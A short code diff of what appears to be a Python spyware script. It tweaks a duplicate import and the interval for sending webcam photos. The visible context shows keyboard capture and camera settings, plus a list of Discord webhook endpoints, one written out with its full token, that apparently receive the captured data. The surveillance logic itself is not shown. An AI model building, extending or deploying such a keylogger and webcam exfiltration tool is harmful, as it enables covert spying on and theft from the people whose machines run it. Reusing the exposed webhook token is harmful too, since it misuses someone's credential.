@@ -1,5 +1,4 @@
 import time
-import time
 import threading
 import keyboard
 import requests
@@ -19,7 +18,7 @@ DISCORD_WEBHOOKS = [
     "https://discord.com/api/webhooks/1464318888714961091/dElHOxtS91PyvPZR3DQRcSNzD0di6vIlTr3qfHs-DUSEutmHxF9jEPJ7BMrWwhthbLf0"
 ]
 SEND_PHOTOS = True  # Set to False to disable photo sending
-PHOTO_INTERVAL = 15  # 5 minutes in seconds
+PHOTO_INTERVAL = 300  # 5 minutes in seconds
 
 # Camera Configuration
 CAMERA_INDEX = 0  # Usually 0 for default camera, 1 for external camera
